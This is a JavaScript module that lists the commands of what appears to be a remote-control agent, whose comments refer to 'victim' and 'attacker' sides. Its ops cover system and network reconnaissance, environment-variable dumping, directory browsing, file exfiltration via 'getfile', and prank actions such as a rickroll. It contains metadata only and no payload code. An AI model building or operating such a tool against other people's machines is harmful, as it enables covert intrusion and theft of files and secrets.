// Data-driven task allowlist: the single source of truth for which ops
// exist, what arguments they take, and how they are presented in help
// output. This module is metadata only — handlers live in
// src/victim/tasks.js, keyed by op name. Adding an op means adding one
// entry here plus one handler there.
//
// argSpec drives attacker-side validation in parseTaskLine:
//   none        op takes no arguments
//   text        free-form text, joined into args.text
//   text!       required free-form text, joined into args.text
//   url         required http(s) URL -> args.url
//   volume      required integer from 0-100 -> args.level
//   path        required path -> args.path (absolute or agent-cwd-relative)
//   path?       optional path -> args.path (default: agent cwd)
//   path+query  "find <dir> <text>" -> args.path + args.query

export const OP_DEFS = Object.freeze([
  { name: 'echo', argSpec: 'text', usage: 'echo <text>', summary: 'echo text back (channel sanity check)' },
  { name: 'ping', argSpec: 'none', usage: 'ping', summary: 'liveness check, answers "pong"' },
  { name: 'time', argSpec: 'none', usage: 'time', summary: 'agent-local time (ISO 8601)' },
  { name: 'sysinfo', argSpec: 'none', usage: 'sysinfo', summary: 'platform, arch, uptime, memory, cpu count' },
  { name: 'whoami', argSpec: 'none', usage: 'whoami', summary: 'user, uid/gid, shell, hostname, pid, node' },
  { name: 'env', argSpec: 'none', usage: 'env', summary: 'environment variables (values redacted unless revealEnv is set)' },
  { name: 'netinfo', argSpec: 'none', usage: 'netinfo', summary: 'network interfaces and addresses' },
  { name: 'ps', argSpec: 'none', usage: 'ps', summary: 'top processes by memory' },
  { name: 'df', argSpec: 'none', usage: 'df', summary: 'filesystem usage' },
  { name: 'pwd', argSpec: 'none', usage: 'pwd', summary: 'agent current working directory' },
  { name: 'cd', argSpec: 'path', usage: 'cd <dir>', summary: 'change agent cwd (relative paths follow it)' },
  { name: 'ls', argSpec: 'path?', usage: 'ls [dir]', summary: 'list a directory (default: agent cwd)' },
  { name: 'stat', argSpec: 'path', usage: 'stat <path>', summary: 'file type, size, mode, timestamps' },
  { name: 'find', argSpec: 'path+query', usage: 'find <dir> <text>', summary: 'files under dir whose name contains text' },
  { name: 'hash', argSpec: 'path', usage: 'hash <file>', summary: 'SHA-256 of a file (read-only, <= 64 MiB)' },
  { name: 'getfile', argSpec: 'path', usage: 'getfile <file>', summary: 'transfer a file back (base64, size-capped)' },
  { name: 'openurl', group: 'fun', argSpec: 'url', usage: 'openurl <url>', summary: 'open an http(s) URL in the default browser' },
  { name: 'say', group: 'fun', argSpec: 'text!', usage: 'say <text>', summary: 'speak up to 200 characters' },
  { name: 'notify', group: 'fun', argSpec: 'text!', usage: 'notify <text>', summary: 'show a desktop notification' },
  { name: 'beep', group: 'fun', argSpec: 'none', usage: 'beep', summary: 'play a short system sound' },
  { name: 'bounce', group: 'fun', argSpec: 'none', usage: 'bounce', summary: 'request visual attention from the desktop' },
  { name: 'volume', group: 'fun', argSpec: 'volume', usage: 'volume <0-100>', summary: 'set the system output volume' },
  { name: 'rickroll', group: 'fun', argSpec: 'none', usage: 'rickroll', summary: 'max the volume and open the classic video' },
  { name: 'party', group: 'fun', argSpec: 'none', usage: 'party', summary: 'beep, notify, and open the party URL' },
]);

export const TASK_OPS = Object.freeze(OP_DEFS.map((o) => o.name));

/** Look up one op definition, or undefined for unknown ops. */
export function getOpDef(name) {
  return OP_DEFS.find((o) => o.name === name);
}
